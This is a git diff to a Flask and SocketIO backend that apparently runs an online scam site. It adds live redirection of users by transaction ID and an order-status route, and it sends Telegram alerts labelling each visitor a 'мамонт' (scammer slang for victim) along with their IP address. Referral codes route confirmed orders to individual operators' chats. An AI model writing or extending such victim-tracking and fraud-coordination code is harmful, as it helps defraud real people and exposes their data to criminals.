@@ -1,5 +1,6 @@
 import random
 from flask import Flask,jsonify,request
+from flask_socketio import SocketIO
 import db_api
 import json
 import string
@@ -12,9 +13,34 @@ adminId = '1945295238'
 
 db_api.create_db()
 
-app = Flask(__name__, static_folder="static")
-CORS(app)
 
+
+app = Flask(__name__, static_folder="static")
+CORS(app, origins=["http://localhost:3000"])
+socketio = SocketIO(app, cors_allowed_origins="*")
+
+@app.route('/')
+def index():
+    return "SocketIO Server is running."
+
+@socketio.on('connect')
+def handle_connect():
+    print('Client connected')
+
+@socketio.on('disconnect')
+def handle_disconnect():
+    print('Client disconnected')
+
+@socketio.on('message')
+def handle_message(data):
+    print('Received message:', data)
+    socketio.send('Echo: ' + data)
+
+@app.route('/send-message', methods=['POST'])
+def send_message():
+    transID = request.json.get('transID')
+    socketio.emit(f'redirect_user_{transID}')
+    return {'status': 'message sent'}
 
 @app.route('/static/<svgFile>')
 def serve_content(svgFile):
@@ -55,18 +81,18 @@ def show_index1():
 def getUser(id):
     user_ip = request.remote_addr
     online = 'true'
-    telegram_message = f'мамонт перешел на сайт \n IP:[{user_ip}]\n ID:[{id}]'
+    telegram_message = f'мамонт перешел на сайт \n IP:[{user_ip}]'
     inline_keyboard = {
         'inline_keyboard': [
-            [{'text': 'Ответить', 'callback_data': f'uans_{id}'}],
+            #[{'text': 'Ответить', 'callback_data': f'uans_{id}'}],
             #[{'text': 'Онлайн?', 'callback_data': f'uans_{id}'}],
             #[{'text': 'Удалить ТП', 'callback_data': f'uans_{id}'}]
         ]
     }
-
+    
     if str(id).isdigit():
-        #response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId,}), headers=headers)
         send_telegram_message(telegram_message, inline_keyboard)
+        #response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId,}), headers=headers)
         return jsonify(id=int(id))
     else:
         id = db_api.getId()
@@ -113,12 +139,17 @@ def confirm(orderId):
     if str(referalCode) != 'null':
         id = db_api.getUserId(referalCode)
         send_telegram_message(telegram_message, inline_keyboard)
-        #response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':id}), headers=headers)
+        requests.post(tgbotUrl, data=json.dumps({**telegram_message, 'chat_id':id}), headers={'Content-Type': 'application/json'})
         #response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId}), headers=headers)
     elif str(referalCode) == 'null':
         send_telegram_message(telegram_message, inline_keyboard)
         #response = requests.post(telegram_api_url, data=json.dumps({**payload, 'chat_id':adminId}), headers=headers)
     return jsonify(status = 'confirmed')
+
+@app.route('/confirm/<orderId>/passed',methods = ['POST'])
+def passOrder(orderId):
+    db_api.changeStatusToReturned(orderId)
+    return jsonify(status = 'passed')
 
 @app.route('/msgSave/<text>/<userId>/<timestamp>/<user>',methods = ['POST'])
 def msgSave(text,userId,timestamp,user):
@@ -127,7 +158,7 @@ def msgSave(text,userId,timestamp,user):
     inline_keyboard = {
         'inline_keyboard': [
             [{'text': 'Ответить', 'callback_data': f'uans_{userId}'}],
-            [{'text': 'Очистить чат', 'callback_data': f'rmchat_{id}'}],
+            [{'text': 'Очистить чат', 'callback_data': f'rmchat_{userId}'}],
         ]
     }
 
@@ -224,6 +255,7 @@ def address_generator(size=6, chars=string.ascii_uppercase + string.digits):
 
 
 if __name__ == '__main__':
-    app.run(host="0.0.0.0", port=8000, debug=True)
+    socketio.run(app, host="0.0.0.0", port=60, debug=True)
+    #app.run(host="0.0.0.0", port=8000, debug=True)
     #from waitress import serve
     #serve(app, host="0.0.0.0", port=8080)
